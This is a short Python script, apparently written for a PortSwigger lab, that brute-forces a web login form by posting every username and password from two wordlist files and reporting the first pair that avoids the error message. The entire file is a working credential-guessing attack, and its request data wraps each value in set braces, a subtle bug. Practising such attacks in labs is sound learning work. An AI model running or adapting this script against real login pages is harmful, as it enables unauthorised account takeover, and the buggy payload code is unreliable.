import requests

def get_login_credentials(url):
    usernames = []
    passwords = []
    
    with open("res/usernames.txt", "r") as file:
        for line in file:
            usernames.append(line.strip())
            
    with open("res/passwords.txt", "r") as file:
        for line in file:
            passwords.append(line.strip())    
            
    for username in usernames:
        for password in passwords:
            data = {"username": {username}, "password": {password}}
            try:
                response = requests.post(url, data=data, timeout=10)
                print(f"Trying username: {username} with {password}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
                continue
            if "Invalid username or password" not in response.text:
                print(f"Valid username: {username}\n"
                      f"Valid password: {password}")
                return username, password
    return "No matching username and password in list."
        
url = "<enter URL here>" ## URL from lab  on portswigger.com :)

get_login_credentials(url)